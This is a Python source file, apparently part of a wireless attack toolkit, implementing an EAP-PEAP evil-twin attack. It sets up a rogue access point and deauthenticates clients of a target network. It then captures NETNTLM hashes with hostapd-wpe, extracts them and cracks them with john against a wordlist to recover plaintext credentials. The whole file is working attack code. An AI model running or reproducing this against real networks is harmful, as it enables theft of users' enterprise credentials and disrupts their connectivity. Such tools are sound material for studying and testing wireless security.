from tempita import sub
from Viper.util.write_conf import write_conf
from Viper.util.channel import change_channel
from Viper.attack.deauth import deauth_broadcast, deauth_client

import subprocess
import os
import re


def attack_EAP_PEAP(interface, ap_mac_address, number_of_deuath, c_mac, essid, channel, directory, dictionary, seconds):
    hostapd_output = os.path.join(directory, 'hostapd-output')
    hash_file = os.path.join(directory, 'hash')
    creds_file = os.path.join(directory, 'creds')

    write_conf(interface, essid, channel)
    change_channel(interface, channel)

    if c_mac:
        deauth_client(interface, number_of_deuath, ap_mac_address, c_mac)
    deauth_broadcast(interface, number_of_deuath, ap_mac_address)
    os.system(f'touch {hostapd_output}')
    f = open(hostapd_output, 'w')
    try:
        subprocess.run(
            ['hostapd-wpe', '/etc/hostapd-wpe/hostapd-wpe.conf'], stdout=f, timeout=seconds)
    except subprocess.TimeoutExpired:
        pass

    with open(hostapd_output) as f:
        output = f.read()

    os.system(f'touch {hash_file}')
    hash = re.findall('NETNTLM:.*', output)[0].split('\t')[-1]
    
    if hash:
        with open(hash_file, 'w') as f:
            f.write(hash)

        subprocess.run(['john', f'--wordlist={dictionary}',hash_file], stdout=subprocess.DEVNULL)
        
        os.system(f'touch {creds_file}')
        f = open(creds_file, 'w')
        subprocess.run(['john','--show',hash_file], stdout=f)
        
        with open(creds_file) as f:
            creds = f.read()

        return creds.split('\n')[0]
    
    else:
        return None
